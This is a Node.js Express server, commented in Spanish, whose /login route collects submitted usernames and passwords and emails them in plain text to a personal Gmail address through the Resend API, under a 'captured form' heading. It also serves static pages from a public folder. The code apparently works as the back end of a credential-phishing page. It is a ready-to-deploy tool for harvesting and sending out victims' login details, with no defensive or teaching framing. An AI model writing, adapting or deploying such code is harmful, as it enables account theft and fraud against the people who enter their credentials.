require('dotenv').config();

const express = require('express');
const { Resend } = require('resend'); // Importación correcta
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();

// --- CONFIGURACIÓN ---
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// --- CONFIGURACIÓN RESEND ---
// Asegúrate de que la variable se llame RESEND_API_KEY en tu .env y en Render
const resend = new Resend(process.env.RESEND_API_KEY);

// --- RUTA PARA RECIBIR LOS DATOS ---
app.post('/login', async (req, res) => {
    const { usuario, password } = req.body;

    console.log(`Intento de envío de: ${usuario}`);

    try {
        const data = await resend.emails.send({
            // CORRECCIÓN AQUÍ: Quitamos el ">" que sobraba al final
            from: "onboarding@resend.dev", 
            to: "paschasin1234@gmail.com", // Solo puedes enviar a este correo si estás en modo prueba
            subject: "Nuevos datos recibidos",
            html: `
                <h2>Formulario capturado</h2>
                <p><strong>Usuario:</strong> ${usuario}</p>
                <p><strong>Contraseña:</strong> ${password}</p>
            `
        });

        console.log("✅ Correo enviado exitosamente vía Resend ID:", data.id);
        res.status(200).send("Datos enviados correctamente");
        
    } catch (error) {
        console.error("❌ Error enviando correo:", error);
        res.status(500).send("Error interno enviando correo");
    }
});

// --- RUTA DE PRUEBA ---
app.get('/ping', (req, res) => {
    res.send('Pong! El servidor está vivo con Resend.');
});

// --- INICIO DEL SERVIDOR ---
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor corriendo en puerto ${PORT}`);
});